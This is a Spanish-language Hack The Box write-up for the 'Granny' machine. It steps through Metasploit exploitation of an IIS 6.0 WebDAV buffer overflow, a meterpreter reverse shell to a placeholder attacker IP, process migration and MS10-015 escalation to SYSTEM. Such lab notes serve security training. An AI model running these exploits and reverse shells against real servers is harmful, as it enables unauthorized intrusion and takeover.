---
tags:
  - Cybersecurity
  - eCPPT
  - Labs
  - HTB
  - Easy
  - HTTP
  - Searchsploit
  - MSF
  - BufferOverflow
  - Migrate
  - MS10-015
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Enumeración del Sistema|Enumeración del Sistema]]
	- [[#Enumeración#Enumeración de Puertos|Enumeración de Puertos]]
	- [[#Enumeración#HTTP|HTTP]]
	- [[#Enumeración#Searchsploit|Searchsploit]]
- [[#Explotación|Explotación]]
	- [[#Explotación#Remote Buffer Overflow|Remote Buffer Overflow]]
- [[#Escalada de Privilegios|Escalada de Privilegios]]
	- [[#Escalada de Privilegios#Migrate|Migrate]]
	- [[#Escalada de Privilegios#Búsqueda de Exploits|Búsqueda de Exploits]]
	- [[#Escalada de Privilegios#MS10-015|MS10-015]]

---
# Granny

![](Screenshots/Pasted%20image%2020260507170819.png)

>Máquina de Hack The Box llamada **[Granny](https://app.hackthebox.com/machines/Granny)**, centrada en la explotación de un servicio vulnerable de **Microsoft IIS 6.0 WebDAV**.  
>La intrusión comienza identificando métodos HTTP peligrosos habilitados en el servidor, lo que permite explotar una vulnerabilidad de **Remote Buffer Overflow** en WebDAV.  
>Tras obtener acceso inicial como `NT AUTHORITY\NETWORK SERVICE`, se realiza migración de proceso para estabilizar la sesión y posteriormente una escalada de privilegios mediante la vulnerabilidad local **MS10-015**, obteniendo acceso como `NT AUTHORITY\SYSTEM`.

---
## Enumeración
### Enumeración del Sistema

```PowerShell
ping -c 1 10.129.95.234
PING 10.129.95.234 (10.129.95.234) 56(84) bytes of data.
64 bytes from 10.129.95.234: icmp_seq=1 ttl=127 time=47.3 ms

--- 10.129.95.234 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 47.336/47.336/47.336/0.000 ms
```

El `TTL=127` indica que probablemente estamos ante un sistema Windows.
### Enumeración de Puertos

```PowerShell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.95.234 -oG allPorts
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127
```

```PowerShell
nmap -p80 -sCV 10.129.95.234 -oN targeted
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-ntlm-info: 
|   Target_Name: GRANNY
|   NetBIOS_Domain_Name: GRANNY
|   NetBIOS_Computer_Name: GRANNY
|   DNS_Domain_Name: granny
|   DNS_Computer_Name: granny
|_  Product_Version: 5.2.3790
|_http-server-header: Microsoft-IIS/6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
|   Server Date: Thu, 07 May 2026 15:09:44 GMT
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_http-title: Under Construction
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Puertos descubiertos:
- `80 → HTTP`
### HTTP

```PowerShell
http://10.129.95.234/
```

![](Screenshots/Pasted%20image%2020260507171600.png)

Se identifica un servidor `Microsoft IIS 6.0` con soporte para `WebDAV`, además de múltiples métodos HTTP peligrosos habilitados como `PUT`, `MOVE`, `PROPFIND` y `SEARCH`.

Esto resulta especialmente interesante, ya que IIS 6.0 WebDAV es conocido por vulnerabilidades históricas de ejecución remota y buffer overflow.
### Searchsploit

```PowerShell
searchsploit "Microsoft IIS 6.0"
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure                                                                                                                          | windows/remote/21057.txt
Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow                                                                                                                                   | windows/remote/9541.pl
Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service                                                                                                                                     | windows/dos/9587.txt
Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                                                                                                                                              | windows/dos/3965.pl
Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065)                                                                                                                    | windows/dos/15167.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                                                                                                                                  | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass                                                                                                                                                   | windows/remote/8765.php
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                                                                                                                               | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                                                                                                                               | windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                                                                                                                                           | windows/remote/8754.patch
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                                                                                                                                  | windows/remote/19033.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Se encuentra varios exploits de `Microsoft IIS 6.0`.

---
## Explotación
### Remote Buffer Overflow

La vulnerabilidad se encuentra en el manejo de peticiones WebDAV dentro del componente `ScStoragePathFromUrl`, permitiendo provocar un desbordamiento de memoria mediante peticiones HTTP especialmente manipuladas.

Se utiliza *Metasploit* para automatizar el proceso.

```PowerShell
msfconsole -q
msf > search Microsoft IIS 6.0

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank    Check  Description
   -  ----                                                 ---------------  ----    -----  -----------
   0  auxiliary/dos/windows/http/ms10_065_ii6_asp_dos      2010-09-14       normal  No     Microsoft IIS 6.0 ASP Stack Exhaustion Denial of Service
   1  exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow

msf > use 1 | use exploit/windows/iis/iis_webdav_scstoragepathfromurl
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show options

Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   MAXPATHLENGTH  60               yes       End of physical path brute force
   MINPATHLENGTH  3                yes       Start of physical path brute force
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     [ATTACKER_IP]     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Windows Server 2003 R2 SP2 x86

msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RHOSTS 10.129.95.234
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set LHOST [ATTACKER_IP]
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > check
[+] 10.129.95.234:80 - The target is vulnerable.
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit
```

Se obtiene una consola interactiva con `nt authority\network service`.

---
## Escalada de Privilegios
### Migrate

Al realizar una enumeración básica del sistema, algunos comandos fallan debido a restricciones de permisos del contexto actual.

La sesión inicial se encuentra inestable y con limitaciones de permisos. Para mejorar la estabilidad y evitar restricciones del proceso comprometido, se migra la sesión a `wmiprvse.exe`, ejecutado bajo el contexto `NT AUTHORITY\NETWORK SERVICE`.

```PowerShell
meterpreter > getuid
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
meterpreter > sysinfo
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
```

Se miran los procesos que están en ejecución.

```PowerShell
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System
 272   4     smss.exe
 320   272   csrss.exe
 344   272   winlogon.exe
 392   344   services.exe
 404   344   lsass.exe
 580   392   svchost.exe
 668   392   svchost.exe
 732   392   svchost.exe
 740   1096  cidaemon.exe
 772   1096  cidaemon.exe
 776   392   svchost.exe
 796   392   svchost.exe
 988   392   spoolsv.exe
 1016  392   msdtc.exe
 1092  1096  cidaemon.exe
 1096  392   cisvc.exe
 1136  392   svchost.exe
 1192  392   inetinfo.exe
 1228  392   svchost.exe
 1340  392   VGAuthService.exe
 1408  392   vmtoolsd.exe
 1520  392   svchost.exe
 1616  392   svchost.exe
 1792  392   dllhost.exe
 1808  2364  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
 1908  392   alg.exe
 1928  580   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 2364  1520  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 2432  580   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 2700  580   wmiprvse.exe
```

Se migra al proceso `wmiprvse.exe`.

```PowerShell
meterpreter > migrate 1928
[*] Migrating from 1808 to 1928...
[*] Migration completed successfully.
meterpreter > sysinfo
Computer        : GRANNY
OS              : Windows Server 2003 (5.2 Build 3790, Service Pack 2).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows
```

Ahora, ya podemos ejecutar comandos, sin tener problemas.
### Búsqueda de Exploits

```PowerShell
meterpreter > background
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use post/multi/recon/local_exploit_suggester
msf post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf post(multi/recon/local_exploit_suggester) > set SESSION 1
msf post(multi/recon/local_exploit_suggester) > exploit
============================

 #   Name                                                              Potentially Vulnerable?  Check Result
 -   ----                                                              -----------------------  ------------
 1   exploit/windows/local/ms10_015_kitrap0d                           Yes                      The service is running, but could not be validated.
 2   exploit/windows/local/ms14_058_track_popup_menu                   Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/ms14_070_tcpip_ioctl                        Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/ms15_051_client_copy_image                  Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms16_016_webdav                             Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/ppr_flatten_rec                             Yes                      The target appears to be vulnerable.
 7   exploit/windows/persistence/registry_userinit                     Yes                      The target is vulnerable. Registry likely exploitable
 8   exploit/multi/persistence/ssh_key                                 No                       The target is not exploitable. sshd_config file not found
 9   exploit/windows/local/adobe_sandbox_adobecollabsync               No                       Cannot reliably check exploitability.
 10  exploit/windows/local/agnitum_outpost_acs                         No                       The target is not exploitable.
 11  exploit/windows/local/always_install_elevated                     No                       The target is not exploitable.
 12  exploit/windows/local/anyconnect_lpe                              No                       The target is not exploitable. vpndownloader.exe not found on file system
 13  exploit/windows/local/bits_ntlm_token_impersonation               No                       The check raised an exception.
 14  exploit/windows/local/bthpan                                      No                       The target is not exploitable.
 15  exploit/windows/local/bypassuac_comhijack                         No                       The target is not exploitable.
 16  exploit/windows/local/bypassuac_eventvwr                          No                       The target is not exploitable.
 17  exploit/windows/local/bypassuac_fodhelper                         No                       The target is not exploitable.
 18  exploit/windows/local/bypassuac_sluihijack                        No                       The target is not exploitable.
 19  exploit/windows/local/canon_driver_privesc                        No                       The target is not exploitable. No Canon TR150 driver directory found
 20  exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move      No                       The target is not exploitable. Target is not running a vulnerable version of Windows!
 21  exploit/windows/local/cve_2020_1048_printerdemon                  No                       The target is not exploitable.
 22  exploit/windows/local/cve_2020_1337_printerdemon                  No                       The target is not exploitable.
 23  exploit/windows/local/gog_galaxyclientservice_privesc             No                       The target is not exploitable. Galaxy Client Service not found
 24  exploit/windows/local/ikeext_service                              No                       The check raised an exception.
 25  exploit/windows/local/ipass_launch_app                            No                       The check raised an exception.
 26  exploit/windows/local/lenovo_systemupdate                         No                       The check raised an exception.
 27  exploit/windows/local/lexmark_driver_privesc                      No                       The check raised an exception.
 28  exploit/windows/local/mqac_write                                  No                       The target is not exploitable.
 29  exploit/windows/local/ms10_092_schelevator                        No                       The target is not exploitable. Windows Server 2003 (5.2 Build 3790, Service Pack 2). is not vulnerable
 30  exploit/windows/local/ms13_053_schlamperei                        No                       The target is not exploitable.
 31  exploit/windows/local/ms13_081_track_popup_menu                   No                       Cannot reliably check exploitability.
 32  exploit/windows/local/ms15_004_tswbproxy                          No                       The target is not exploitable.
 33  exploit/windows/local/ms16_032_secondary_logon_handle_privesc     No                       The check raised an exception.
 34  exploit/windows/local/ms16_075_reflection                         No                       The check raised an exception.
 35  exploit/windows/local/ms16_075_reflection_juicy                   No                       The check raised an exception.
 36  exploit/windows/local/ms_ndproxy                                  No                       The target is not exploitable.
 37  exploit/windows/local/novell_client_nicm                          No                       The target is not exploitable.
 38  exploit/windows/local/ntapphelpcachecontrol                       No                       The check raised an exception.
 39  exploit/windows/local/ntusermndragover                            No                       The target is not exploitable.
 40  exploit/windows/local/panda_psevents                              No                       The target is not exploitable.
 41  exploit/windows/local/ricoh_driver_privesc                        No                       The target is not exploitable. No Ricoh driver directory found
 42  exploit/windows/local/tokenmagic                                  No                       The target is not exploitable.
 43  exploit/windows/local/virtual_box_guest_additions                 No                       The target is not exploitable.
 44  exploit/windows/local/webexec                                     No                       The check raised an exception.
 45  exploit/windows/persistence/accessibility_features_debugger       No                       The target is not exploitable. You have admin rights to run this Module
 46  exploit/windows/persistence/assistive_technology                  No                       The target is not exploitable. Only supported on Windows 8 and above
 47  exploit/windows/persistence/notepadpp_plugin                      No                       The target is not exploitable. Notepad++ is probably not present
 48  exploit/windows/persistence/registry                              No                       The target is not exploitable. System does not have powershell
 49  exploit/windows/persistence/registry_active_setup                 No                       The target is not exploitable. System does not have powershell
 50  exploit/windows/persistence/service                               No                       The check raised an exception.
 51  exploit/windows/persistence/service_for_user/lock_unlock          No                       The target is not exploitable. This module only works on Vista/2008 and above
 52  exploit/windows/persistence/service_for_user/logon                No                       The target is not exploitable. This module only works on Vista/2008 and above
 53  exploit/windows/persistence/service_for_user/schedule             No                       The target is not exploitable. This module only works on Vista/2008 and above
 54  exploit/windows/persistence/startup_folder                        No                       The target is not exploitable. Unable to write to C:\Documents and Settings\Default User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup                                                                                                                                                                                                                             
 55  exploit/windows/persistence/task_scheduler                        No                       The target is not exploitable. You need higher privileges to create scheduled tasks
 56  exploit/windows/persistence/userinit_mpr_logon_script             No                       The target is not exploitable. Unable to write to registry path HKCU\Environment
 57  exploit/windows/persistence/wmi/wmi_event_subscription_event_log  No                       The target is not exploitable. This module requires powershell to run
 58  exploit/windows/persistence/wmi/wmi_event_subscription_interval   No                       The target is not exploitable. This module requires powershell to run
 59  exploit/windows/persistence/wmi/wmi_event_subscription_process    No                       The target is not exploitable. This module requires powershell to run
 60  exploit/windows/persistence/wmi/wmi_event_subscription_uptime     No                       The target is not exploitable. This module requires powershell to run
```
### MS10-015

La vulnerabilidad `MS10-015` permite escalar privilegios en Windows mediante un fallo en el kernel (`KiTrap0D`), obteniendo ejecución como `NT AUTHORITY\SYSTEM`.

```PowerShell
msf post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms10_015_kitrap0d
msf exploit(windows/local/ms10_015_kitrap0d) > show options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     [ATTACKER_IP]    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)
   
msf exploit(windows/local/ms10_015_kitrap0d) > set LHOST [ATTACKER_IP]
msf exploit(windows/local/ms10_015_kitrap0d) > set LPORT 4445
msf exploit(windows/local/ms10_015_kitrap0d) > set SESSION 1
msf exploit(windows/local/ms10_015_kitrap0d) > exploit
```

Se obtiene una consola interactiva con `nt authority\system`.

La flag de `usuario` se encuentra en: `C:\Documents and Settings\Lakis\Desktop`.

La flag de `root` se encuentra en: `C:\Documents and Settings\Administrator\Desktop`.

---